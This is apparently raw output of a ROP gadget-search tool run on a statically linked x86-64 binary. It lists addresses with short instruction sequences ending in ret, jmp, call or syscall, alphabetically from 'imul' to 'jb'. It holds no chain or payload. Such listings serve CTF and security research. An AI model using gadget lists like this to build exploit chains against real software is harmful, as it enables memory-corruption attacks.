0x0000000000468232 : imul eax, dword ptr [rcx], 0xc7480000 ; ret 0xffe0
0x0000000000428b37 : imul eax, dword ptr [rdi], 0x894d0000 ; retf
0x0000000000462c15 : imul eax, dword ptr [rsi], 0 ; add al, ch ; ret 0xf9ef
0x00000000004900ee : imul ebx, dword ptr [rax], -0x18 ; retf
0x0000000000429e97 : imul ecx, dword ptr [rbx], 0x894d0000 ; retf
0x000000000042b077 : imul ecx, dword ptr [rcx], 0x894d0000 ; retf
0x0000000000428837 : imul ecx, dword ptr [rdx], 0x894d0000 ; retf
0x00000000004ad637 : imul ecx, dword ptr [rsi], 0x18 ; ret
0x0000000000404a34 : imul edi, edx, -1 ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000428237 : imul edx, dword ptr [rax], 0x894d0000 ; retf
0x0000000000427f37 : imul edx, dword ptr [rbx], 0x894d0000 ; retf
0x0000000000427c37 : imul edx, dword ptr [rsi], 0x894d0000 ; retf
0x0000000000418b5e : imul esp, dword ptr [rax + 0x5b], 0x5d ; pop r12 ; ret
0x000000000044493c : imul esp, dword ptr [rsi + 0xf], 0x74 ; ret 0xff3
0x0000000000476458 : in al, 0x3c ; std ; dec dword ptr [rax + 0x39] ; ret
0x00000000004afc40 : in al, 0x42 ; add byte ptr [rax], al ; in al, dx ; mov cl, bh ; jmp rbx
0x0000000000495d00 : in al, 0x44 ; sti ; jmp qword ptr [rcx]
0x0000000000495c20 : in al, 0x44 ; sti ; jmp rsp
0x00000000004a9441 : in al, 0x4c ; pop rax ; retf
0x000000000044164c : in al, 0x74 ; or dword ptr [rax - 1], ecx ; ret 0xc148
0x000000000044cbd3 : in al, 0x80 ; cli ; cmp eax, 0x83497174 ; ret
0x000000000047b9f8 : in al, 0xe8 ; ret 0xf84a
0x000000000045e4e0 : in al, 0xf ; lahf ; ret
0x000000000043552a : in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00000000004485de : in al, 0xf3 ; ret
0x000000000049470d : in al, 0xf9 ; jmp qword ptr [rax]
0x000000000049472d : in al, 0xf9 ; jmp rax
0x0000000000450360 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; push rsi ; ret
0x0000000000422df4 : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x298
0x00000000004166eb : in al, dx ; add byte ptr [rax], 0 ; add al, ch ; retf
0x00000000004af848 : in al, dx ; add byte ptr ds:[rax], al ; adc al, 0x9c ; clc ; jmp qword ptr [rsi]
0x000000000044dce3 : in al, dx ; add byte ptr es:[rbp - 0xcf98b40], al ; ret
0x000000000045e984 : in al, dx ; add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x000000000045e7c1 : in al, dx ; add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00000000004afc44 : in al, dx ; mov cl, bh ; jmp rbx
0x0000000000415381 : in al, dx ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004301fa : in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043592a : in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000041f67f : in al, dx ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000042b0f4 : in al, dx ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004a962d : in al, dx ; retf 0xae32
0x000000000048de89 : in al, dx ; sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x000000000048a904 : in al, dx ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000494c85 : in al, dx ; stc ; jmp qword ptr [rax]
0x0000000000495c0c : in al, dx ; sti ; jmp qword ptr [rcx]
0x000000000047800d : in al, dx ; sub byte ptr [rbp + rcx*4 + 0x15], cl ; ret
0x00000000004a955e : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4a94f1 ; ret 0x48f
0x00000000004a955d : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x4a94f2 ; ret 0x48f
0x0000000000449bd6 : in eax, 0 ; add byte ptr [rax], al ; syscall
0x000000000045cdda : in eax, 0x18 ; add byte ptr [rax], al ; add byte ptr [rbx + rcx*4 + 0x2d], cl ; retf 0x25f1
0x00000000004a7c63 : in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x0000000000484872 : in eax, 0x48 ; mov eax, esi ; ret
0x00000000004a6ef9 : in eax, 0x6a ; mov eax, 0x45155e93 ; ret 0x591c
0x000000000048c3ca : in eax, 0x83 ; call qword ptr [rcx]
0x000000000046374d : in eax, 0xdf ; loopne 0x4636de ; ret
0x00000000004a9b19 : in eax, 0xe2 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00000000004a7cba : in eax, 0xe5 ; retf 0x2a91
0x0000000000474963 : in eax, 0xf ; je 0x474988 ; add rax, 2 ; ret
0x0000000000448a99 : in eax, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x00000000004355aa : in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000049464d : in eax, 0xf9 ; call qword ptr [rax]
0x0000000000494771 : in eax, 0xf9 ; jmp qword ptr [rax]
0x000000000049468d : in eax, 0xf9 ; jmp rax
0x00000000004a8fe1 : in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000424feb : in eax, 2 ; cmovne rax, rdx ; ret
0x0000000000466cf8 : in eax, dx ; add al, 0x84 ; ror byte ptr [rdi], 0x84 ; ret 0x17
0x000000000044da85 : in eax, dx ; add cl, ch ; retf
0x0000000000469e88 : in eax, dx ; add dword ptr [rax - 0x91743], eax ; jmp qword ptr [rax]
0x0000000000414282 : in eax, dx ; call 0x4004ab
0x0000000000452dec : in eax, dx ; cli ; inc dword ptr [rcx - 0x77] ; ret
0x000000000044b02a : in eax, dx ; jne 0x44b047 ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bb95 : in eax, dx ; jne 0x44bbbf ; mov rdi, qword ptr [rbx] ; call r12
0x000000000044bbc8 : in eax, dx ; jne 0x44bc18 ; mov rdi, qword ptr [rbp] ; call r12
0x000000000044bbf4 : in eax, dx ; jne 0x44bc78 ; mov rdi, qword ptr [rbp] ; call r12
0x00000000004900ff : in eax, dx ; jne 0x4900e1 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000490352 : in eax, dx ; jne 0x49033f ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000490f0c : in eax, dx ; jne 0x490ef7 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000447182 : in eax, dx ; lea rax, [rcx - 1] ; ret
0x000000000043000a : in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004359aa : in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000482ce7 : in eax, dx ; or byte ptr [rax + 0x39], cl ; retf
0x0000000000416d72 : in eax, dx ; ret
0x00000000004a7a38 : in eax, dx ; retf
0x0000000000494cc5 : in eax, dx ; stc ; jmp qword ptr [rax + 0x20fff9ee]
0x00000000004472d2 : in eax, dx ; sub rax, 1 ; ret
0x00000000004475e8 : inc bl ; cmp dl, 1 ; jb 0x4475fa ; mov byte ptr [rdi], cl ; ret
0x0000000000417362 : inc byte ptr [rbp + 0x738948c9] ; cmp byte ptr [rdi], cl ; ret 0x389
0x000000000044b1bc : inc byte ptr [rbp - 0x60f0be13] ; ret 0x8545
0x0000000000459015 : inc byte ptr [rbx] ; je 0x459025 ; ret
0x000000000047f308 : inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000494a1f : inc dword ptr [rax + 0x16] ; cli ; call rax
0x0000000000494807 : inc dword ptr [rax + 0x19] ; cli ; call rax
0x0000000000494f17 : inc dword ptr [rax + 0x3d] ; cli ; call rax
0x000000000049471f : inc dword ptr [rax + 0x40fff9de] ; loopne 0x494728 ; jmp qword ptr [rax]
0x000000000049467f : inc dword ptr [rax + 0x40fff9df] ; loope 0x494688 ; jmp qword ptr [rax]
0x0000000000494313 : inc dword ptr [rax + 0x6d] ; stc ; push qword ptr [rax] ; outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x000000000049470b : inc dword ptr [rax - 0x1c] ; stc ; jmp qword ptr [rax]
0x0000000000494667 : inc dword ptr [rax - 0x1d] ; stc ; jmp qword ptr [rax]
0x0000000000494683 : inc dword ptr [rax - 0x1f] ; stc ; jmp qword ptr [rax]
0x0000000000494723 : inc dword ptr [rax - 0x20] ; stc ; jmp qword ptr [rax]
0x000000000049473f : inc dword ptr [rax - 0x22] ; stc ; inc dword ptr [rax] ; loopne 0x494748 ; call rax
0x00000000004947f3 : inc dword ptr [rax - 0x27] ; stc ; call qword ptr [rax - 0x1f000626]
0x000000000049479f : inc dword ptr [rax - 0x2e] ; stc ; call qword ptr [rax - 0x1f00062d]
0x0000000000495317 : inc dword ptr [rax - 0x2f000556] ; stosd dword ptr [rdi], eax ; cli ; jmp qword ptr [rax]
0x00000000004947af : inc dword ptr [rax - 0x2f000629] ; fdivr st(1) ; jmp qword ptr [rax]
0x00000000004947c3 : inc dword ptr [rax - 0x2f000637] ; retf 0xfff9
0x00000000004945e3 : inc dword ptr [rax - 0x2f000655] ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x00000000004945af : inc dword ptr [rax - 0x43] ; stc ; call qword ptr [rax]
0x0000000000494487 : inc dword ptr [rax - 0x45] ; stc ; jmp qword ptr [rax]
0x0000000000494627 : inc dword ptr [rax - 0x53] ; stc ; call qword ptr [rax - 0x1f000652]
0x00000000004945d3 : inc dword ptr [rax - 0x5a] ; stc ; call qword ptr [rax - 0x1f000659]
0x0000000000495307 : inc dword ptr [rax - 0x5b] ; cli ; call qword ptr [rax - 0x1f00055a]
0x0000000000494c7f : inc dword ptr [rax - 0x5f000615] ; in al, dx ; stc ; jmp qword ptr [rax]
0x00000000004952df : inc dword ptr [rax - 0x65] ; cli ; jmp rax
0x0000000000494463 : inc dword ptr [rax - 0x67] ; stc ; call rax
0x00000000004952bf : inc dword ptr [rax - 0x72] ; cli ; jmp rax
0x000000000046a5dd : inc dword ptr [rax - 0x91743] ; jmp qword ptr [rax]
0x000000000045ee75 : inc dword ptr [rax - 0x93b43] ; jmp qword ptr [rax]
0x0000000000494837 : inc dword ptr [rax] ; adc al, 0xfa ; call qword ptr [rax + 0x26fffa13]
0x00000000004604a9 : inc dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; retf 0x8944
0x000000000045ee36 : inc dword ptr [rax] ; add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x0000000000448a3f : inc dword ptr [rax] ; add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x000000000042e157 : inc dword ptr [rax] ; add byte ptr [rax], al ; sub eax, ecx ; ret
0x0000000000495377 : inc dword ptr [rax] ; clc ; cli ; call qword ptr [rax]
0x000000000049523f : inc dword ptr [rax] ; cli ; call qword ptr [rax]
0x0000000000494d2f : inc dword ptr [rax] ; cmp edi, edx ; call qword ptr [rax + 0x20fffa3a]
0x000000000049472b : inc dword ptr [rax] ; in al, 0xf9 ; jmp rax
0x000000000049468b : inc dword ptr [rax] ; in eax, 0xf9 ; jmp rax
0x0000000000494323 : inc dword ptr [rax] ; jno 0x494328 ; push rax ; jno 0x49432c ; jmp rax
0x00000000004946a7 : inc dword ptr [rax] ; jrcxz 0x4946a8 ; jmp rax
0x0000000000494743 : inc dword ptr [rax] ; loopne 0x494744 ; call rax
0x0000000000495337 : inc dword ptr [rax] ; mov ch, 0xfa ; call qword ptr [rax + 0x20fffaa1]
0x0000000000494c73 : inc dword ptr [rax] ; or bh, dl ; push qword ptr [rax + 9] ; cli ; jmp rax
0x0000000000494a6f : inc dword ptr [rax] ; or edi, edx ; push qword ptr [rax + 0xa] ; cli ; jmp rax
0x00000000004942df : inc dword ptr [rax] ; pop rbp ; stc ; push qword ptr [rax + 0x5e] ; stc ; jmp rax
0x0000000000494497 : inc dword ptr [rax] ; ret
0x0000000000494a0f : inc dword ptr [rax] ; sbb dl, bh ; call qword ptr [rax + 0x20fffa17]
0x00000000004953cf : inc dword ptr [rax] ; std ; cli ; call qword ptr [rax]
0x0000000000495b0b : inc dword ptr [rax] ; sti ; jmp qword ptr [rcx]
0x000000000049425f : inc dword ptr [rax] ; xor cl, bh ; jmp qword ptr [rax]
0x0000000000494f77 : inc dword ptr [rax] ; xor dl, bh ; push qword ptr [rax + 0x2f] ; cli ; jmp rsi
0x0000000000455934 : inc dword ptr [rbp + 0x31] ; fisttp dword ptr [rcx - 0x7d] ; ret
0x00000000004057c3 : inc dword ptr [rbp + 0x4dc879c0] ; mov edi, esp ; jmp 0x4057a0
0x000000000047bd7f : inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x00000000004826fc : inc dword ptr [rbp - 0x76b08a40] ; ret
0x0000000000402830 : inc dword ptr [rbp - 0x7aa48740] ; ror byte ptr [rdi], 0x84 ; ret
0x0000000000400927 : inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x0000000000495b37 : inc dword ptr [rbx + rax*2 - 5] ; jmp qword ptr [rcx]
0x000000000040d5ab : inc dword ptr [rbx - 0x2f7cfe08] ; dec dword ptr [rax - 0x7d] ; ret
0x000000000048e3f9 : inc dword ptr [rbx - 0x38b7f808] ; ret 0xffff
0x000000000045a090 : inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x000000000048c5f3 : inc dword ptr [rbx - 0x7bf0bf1e] ; ret
0x000000000045edf4 : inc dword ptr [rbx - 0x8f743] ; call qword ptr [rax]
0x0000000000448afd : inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x0000000000448a6b : inc dword ptr [rbx] ; pop rbx ; ret
0x000000000047f309 : inc dword ptr [rcx + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004601c2 : inc dword ptr [rcx + 0x29] ; ret 0x8545
0x000000000046cf39 : inc dword ptr [rcx + 0x29] ; retf 0x98e9
0x0000000000488134 : inc dword ptr [rcx + 0xf] ; mov dh, 0x49 ; add al, 0x89 ; retf 0xeac0
0x0000000000481042 : inc dword ptr [rcx + rbp - 0x40] ; ret
0x000000000041304b : inc dword ptr [rcx + rcx*4 - 0x18] ; syscall
0x000000000046f981 : inc dword ptr [rcx + rcx*4 - 0x40] ; jmp 0x46f957
0x00000000004943af : inc dword ptr [rcx - 0x65] ; stc ; call rcx
0x0000000000494383 : inc dword ptr [rcx - 0x6c] ; stc ; call qword ptr [rcx]
0x0000000000452dee : inc dword ptr [rcx - 0x77] ; ret
0x00000000004560d6 : inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x000000000045a093 : inc dword ptr [rcx - 0x77] ; ret 0x840f
0x000000000046dcf6 : inc dword ptr [rcx - 0x7d] ; retf
0x000000000044aea7 : inc dword ptr [rcx - 0x7d] ; retf 0x8940
0x0000000000469b4f : inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000046525f : inc dword ptr [rcx] ; retf
0x00000000004948f3 : inc dword ptr [rdx + 0x14] ; cli ; call rdx
0x0000000000494ffb : inc dword ptr [rdx + 0x2f] ; cli ; call rdx
0x0000000000494deb : inc dword ptr [rdx + 0x3b] ; cli ; call rdx
0x0000000000495a8f : inc dword ptr [rdx + 0x44] ; sti ; call rdi
0x0000000000494eb3 : inc dword ptr [rdx + rdi - 6] ; call rsp
0x0000000000494ddb : inc dword ptr [rdx] ; cmp eax, 0x3c92fffa ; cli ; jmp qword ptr [rdx]
0x000000000044037d : inc dword ptr [rip - 0x7cb80000] ; ret 0x4910
0x000000000049484f : inc dword ptr [rsi + 0x18] ; cli ; call rsi
0x0000000000494d47 : inc dword ptr [rsi + 0x3f] ; cli ; call rsi
0x0000000000495b33 : inc dword ptr [rsi + 0x44fffb43] ; sti ; jmp qword ptr [rcx]
0x000000000049594b : inc dword ptr [rsi - 0x510004bc] ; sti ; jmp qword ptr [rcx]
0x000000000048e1d2 : inc dword ptr [rsi*2 + 0x8b80f] ; add byte ptr [rax], al ; ret
0x0000000000494827 : inc eax ; adc eax, 0x1550fffa ; cli ; jmp rax
0x00000000004953bf : inc eax ; cld ; cli ; call rax
0x000000000049445f : inc eax ; cwde ; stc ; inc dword ptr [rax - 0x67] ; stc ; call rax
0x0000000000495367 : inc eax ; idiv edx ; call rax
0x00000000004a4fcf : inc eax ; jne 0x4a4fd4 ; call qword ptr [rax]
0x00000000004945f3 : inc eax ; mov al, 0xf9 ; call qword ptr [rax]
0x00000000004944d7 : inc eax ; ret 0xfff9
0x0000000000495327 : inc eax ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rax]
0x00000000004953ef : inc eax ; std ; cli ; jmp rax
0x000000000042caac : inc ebp ; std ; xlatb ; ret 0xe883
0x0000000000471fdc : inc ebx ; nop ; xor eax, eax ; ret
0x0000000000446e59 : inc ebx ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x0000000000494e93 : inc esp ; cmp eax, 0x3d54fffa ; cli ; jmp rsp
0x00000000004948bc : insb byte ptr [rdi], dx ; adc edi, edx ; call qword ptr [rdx]
0x00000000004250db : insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000042b874 : insb byte ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000048ea2b : insb byte ptr [rdi], dx ; and al, 8 ; jmp 0x48ea47
0x0000000000485477 : insb byte ptr [rdi], dx ; and eax, dword ptr [rax] ; add word ptr [rdx + rax*2], 1 ; ret
0x00000000004a9b1e : insb byte ptr [rdi], dx ; insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x000000000045d585 : insb byte ptr [rdi], dx ; ret 0x4c40
0x00000000004a8ee6 : insb byte ptr [rdi], dx ; shr byte ptr [rdx], 0x43 ; add cl, bl ; retf 0xea91
0x0000000000424df0 : insb byte ptr [rdi], dx ; xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000453aa6 : insd dword ptr [rdi], dx ; add al, 0 ; add bh, dh ; ret 0xf800
0x0000000000409fbf : insd dword ptr [rdi], dx ; add al, 0 ; add byte ptr [rbx - 0x7bf0fe08], al ; ret 4
0x0000000000424ceb : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000490182 : insd dword ptr [rdi], dx ; js 0x4901ff ; ret 0x8b48
0x00000000004a9b1f : insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00000000004a7ecd : insd dword ptr [rdi], dx ; ret 0xb9b9
0x00000000004038a7 : insd dword ptr [rdi], dx ; retf
0x0000000000494315 : insd dword ptr [rdi], dx ; stc ; push qword ptr [rax] ; outsb dx, byte ptr [rsi] ; stc ; jmp qword ptr [rax]
0x000000000042502b : insd dword ptr [rdi], dx ; sub dword ptr [rax], eax ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004a8ddf : insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000451605 : int 0x19
0x000000000046822a : int 0x80
0x000000000044fb87 : int 0xc2
0x0000000000455e76 : int 0xf
0x0000000000474386 : int1 ; call rbx
0x000000000047bd7d : int1 ; cld ; inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x0000000000452deb : int1 ; in eax, dx ; cli ; inc dword ptr [rcx - 0x77] ; ret
0x0000000000456cb2 : int1 ; je 0x456e61 ; mov rdx, rax ; jmp 0x456c79
0x00000000004570b7 : int1 ; je 0x456e61 ; mov rdx, rax ; jmp 0x45707e
0x000000000045712e : int1 ; je 0x456e61 ; mov rdx, rax ; jmp 0x4570f5
0x000000000044756b : int1 ; jl 0x4475bc ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044758c : int1 ; jl 0x4475dd ; adc dword ptr [rsi - 1], edx ; ret
0x000000000044759f : int1 ; jl 0x4475f0 ; adc dword ptr [rsi - 1], edx ; ret
0x0000000000447674 : int1 ; jl 0x4476c5 ; adc dword ptr [rsi - 1], edx ; ret
0x00000000004476cc : int1 ; jl 0x44771d ; adc dword ptr [rsi + 3], edx ; ret
0x0000000000447769 : int1 ; jl 0x4477ba ; adc dword ptr [rsi + 7], edx ; ret
0x00000000004489f5 : int1 ; jmp rcx
0x0000000000471d3b : int1 ; jne 0x471d36 ; lea eax, [rdx + rdi] ; ret
0x000000000047e807 : int1 ; jne 0x47e7e4 ; ret
0x00000000004a8da4 : int1 ; lodsd eax, dword ptr [rsi] ; mov esi, 0x497b96cc ; retf 0x99e0
0x0000000000448b19 : int1 ; mov eax, eax ; ret
0x000000000043539b : int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004307cf : int1 ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000446933 : int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x0000000000448b00 : int1 ; pop rbx ; mov eax, eax ; ret
0x00000000004a94f6 : int1 ; ret 0x5803
0x0000000000494c91 : int1 ; stc ; jmp qword ptr [rax + 0x20fff9f2]
0x0000000000494cd1 : int1 ; stc ; jmp qword ptr [rax]
0x0000000000446937 : int1 ; sub eax, edx ; ret
0x0000000000400926 : iretd ; inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x0000000000496868 : iretd ; jne 0x49686d ; dec dword ptr [rsi + rsi*2] ; sti ; jmp qword ptr [rax]
0x0000000000405e8d : ja 0x405e6e ; mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004220b5 : ja 0x4220e5 ; add byte ptr [rax - 0x7d], cl ; retf 0x4901
0x00000000004392a3 : ja 0x4392a7 ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x0000000000444a87 : ja 0x444a8d ; ret
0x0000000000444aa3 : ja 0x444aad ; mov dword ptr [rdi], ecx ; ret
0x0000000000444ae4 : ja 0x444af3 ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b69 : ja 0x444b7d ; ret
0x0000000000444bbf : ja 0x444bd7 ; ret
0x0000000000444c41 : ja 0x444c5d ; ret
0x00000000004450a7 : ja 0x4450b1 ; lea rax, [rdi + 2] ; ret
0x00000000004450c3 : ja 0x4450d1 ; mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000445114 : ja 0x445127 ; mov qword ptr [rdi], rcx ; lea rax, [rdi + 8] ; ret
0x00000000004451f9 : ja 0x445211 ; lea rax, [rdi + 0x10] ; ret
0x000000000044526f : ja 0x44528b ; lea rax, [rdi + 0x14] ; ret
0x00000000004452f1 : ja 0x445311 ; lea rax, [rdi + 0x18] ; ret
0x0000000000447874 : ja 0x4478a5 ; jb 0x447886 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000447bd4 : ja 0x447c1a ; jb 0x447be6 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000448024 : ja 0x448082 ; jb 0x448036 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004485f3 : ja 0x448610 ; jb 0x4485ff ; mov byte ptr [rdi], cl ; ret
0x0000000000448761 : ja 0x448798 ; jb 0x448770 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000448929 : ja 0x44896e ; jb 0x448938 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000044993c : ja 0x449968 ; hlt ; mov edi, edx ; mov eax, r8d ; syscall
0x0000000000449efb : ja 0x449f03 ; ret
0x0000000000449f49 : ja 0x449f53 ; ret
0x000000000044a154 : ja 0x44a1b3 ; ret
0x000000000044a1ea : ja 0x44a1f3 ; ret
0x000000000044a227 : ja 0x44a283 ; ret
0x000000000044a2bd : ja 0x44a2cb ; ret
0x000000000044a2ed : ja 0x44a2fb ; ret
0x000000000044a4f7 : ja 0x44a53b ; ret
0x000000000044a56d : ja 0x44a57b ; ret
0x000000000044acc6 : ja 0x44acd3 ; ret
0x000000000044d0b0 : ja 0x44d0dd ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000044ddd5 : ja 0x44de29 ; movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x000000000045b853 : ja 0x45b863 ; ret
0x0000000000465f72 : ja 0x465f55 ; mov eax, r9d ; ret
0x0000000000474e49 : ja 0x474e17 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00000000004756cb : ja 0x4756d3 ; ret
0x000000000047571f : ja 0x47572b ; ret
0x0000000000475a40 : ja 0x475a6b ; ret
0x0000000000478c70 : ja 0x478c6f ; dec dword ptr [rax - 0x77] ; ret
0x0000000000482f9e : ja 0x482ff0 ; shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x000000000048dd8d : ja 0x48dd96 ; sbb eax, eax ; ret
0x00000000004967e9 : ja 0x4967ec ; ljmp [rax + 0x76] ; sti ; call qword ptr [rdx]
0x00000000004967f1 : ja 0x4967f4 ; lcall [rsi + 0x78] ; sti ; call qword ptr [rdi]
0x00000000004a9564 : ja 0x4a94eb ; ret 0x48f
0x00000000004190ad : jae 0x4190d5 ; movzx eax, byte ptr [rax] ; ret
0x00000000004498ed : jae 0x4498f2 ; ret
0x0000000000449e6d : jae 0x449e72 ; ret
0x000000000044aefd : jae 0x44af02 ; ret
0x000000000044af2d : jae 0x44af32 ; ret
0x000000000044af5d : jae 0x44af62 ; ret
0x000000000044c600 : jae 0x44c605 ; ret
0x000000000044c62d : jae 0x44c632 ; ret
0x000000000044c934 : jae 0x44c923 ; ret
0x000000000045574f : jae 0x4556dc ; retf 0xb941
0x000000000045b5fe : jae 0x45b645 ; xor eax, eax ; pop rbx ; ret
0x000000000047564d : jae 0x475652 ; ret
0x000000000047fa8b : jae 0x47fa35 ; xor eax, eax ; ret
0x0000000000488204 : jae 0x4881e7 ; mov eax, 1 ; ret
0x00000000004886bd : jae 0x4886c2 ; ret
0x000000000048ed16 : jae 0x48ed29 ; mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x00000000004a4f45 : jae 0x4a4f46 ; jmp qword ptr [rax]
0x00000000004a7b22 : jae 0x4a7b04 ; jo 0x4a7ba0 ; mov ebp, 0xfb67d10d ; ret
0x00000000004a89be : jae 0x4a8999 ; push rsi ; pop rdx ; je 0x4a898e ; ret 0xacfc
0x00000000004ad392 : jae 0x4ad3a0 ; ret
0x000000000041e537 : jb 0x41e521 ; mov byte ptr [rsi + rbx], cl ; mov rax, rsi ; pop rbx ; ret
0x00000000004225ba : jb 0x4225ea ; add byte ptr [rax - 0x7d], cl ; retf 0x4901
0x000000000042e7da : jb 0x42e7ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042e92a : jb 0x42e93a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ea7a : jb 0x42ea8a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ebca : jb 0x42ebda ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ed1a : jb 0x42ed2a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042ee6a : jb 0x42ee7a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042efba : jb 0x42efca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f10a : jb 0x42f11a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f25a : jb 0x42f26a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f3aa : jb 0x42f3ba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f4fa : jb 0x42f50a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f64a : jb 0x42f65a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f79a : jb 0x42f7aa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042f8ea : jb 0x42f8fa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042fa3a : jb 0x42fa4a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004311aa : jb 0x4311ba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004312fa : jb 0x43130a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043144a : jb 0x43145a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043159a : jb 0x4315aa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004316ea : jb 0x4316fa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043183a : jb 0x43184a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043198a : jb 0x43199a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431ada : jb 0x431aea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431c2a : jb 0x431c3a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431d7a : jb 0x431d8a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000431eca : jb 0x431eda ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000043201a : jb 0x43202a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
